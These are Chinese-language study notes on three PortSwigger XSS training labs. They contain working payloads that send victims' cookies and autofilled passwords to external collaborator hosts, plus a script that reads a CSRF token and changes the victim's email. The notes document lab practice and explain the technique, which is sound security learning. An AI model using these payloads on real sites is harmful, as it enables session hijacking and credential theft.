## 利用跨站脚本漏洞窃取 Cookie
实验：利用跨站脚本攻击窃取 cookie
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
使用评论功能
POST /post/comment HTTP/2
csrf=LS6sbIWhHtrLqJUOu5Sqfic7OlTDOoDD&postId=1&comment=aaaaaaa&name=bbbbbbbb&email=cccccccc%40a&website=http%3Addddddddddd

返回页面
GET /post?postId=1 HTTP/2
响应为
```html
<section class="comment">
    <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="http:ddddddddddd">bbbbbbbb</a> | 13 October 2025
    </p>
    <p>aaaaaaa</p>
    <p></p>
</section>
```
在评论中输入：
<img src="x" onerror="fetch('https://BurpCollaborator/?data='+document.cookie)">  
应用得到cookie

示例解决方案
```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
```


## 利用跨站脚本攻击来获取密码

实验：利用跨站脚本攻击捕获密码
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
使用自动填充功能获取密码

```html
<!-- 示例解决方案 -->
<input name=username id=username style="z-index: -1;position:absolute">
<input type=password name=password onchange="if(this.value.length)fetch('https://nkbdcrjkr048vq4tovmf9tr0sryimda2.oastify.com/',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});" style="z-index: -1;position:absolute">
<!-- 其中css设置为 display:none 或 visibility: hidden 将无法触发自动表单填写，于是设置z轴方向显示在其他元素的后方 -->
```


## 利用跨站脚本绕过 CSRF 保护

实验：利用 XSS 绕过 CSRF 防御
https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

更改email的post内容
POST /my-account/change-email HTTP/2
email=aaaaa%40a&csrf=9gcfzGcUiyUkMGYmjaS2GmMYTOZZ2ktx

参照之前lab，新增在评论页面读取csrf令牌
```html
<!-- 似乎无法使用dom读取当前加载页面的csrf值 -->
<!-- 示例解决方案：不是尝试将csrf令牌的值传回控制服务器，而是在受害者浏览器上使用此令牌执行操作。
 且由于在受害者浏览器上进行请求，cookie头自动提交 -->
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;    /* 设置请求完成时的事件监听器 */
req.open('get','/my-account',true); 
/* 访问账户表单页面，响应中包括csrf令牌。文章页面的评论表格使用相同的csrf令牌。参数 true 设置异步模式 */
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
    // responseText 获取服务器返回的‌文本形式‌的响应数据
    // \w+ 匹配一个或多个单词字符（等价于 [a-zA-Z0-9_]）
    // 括号 () 表示捕获组，提取引号内的内容
    // [1]提取第一个捕获组的内容
    var changeReq = new XMLHttpRequest(); 
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
    // 浏览器自动设置cookie头部，此处只需设置csrf与邮件地址
};
</script>
```
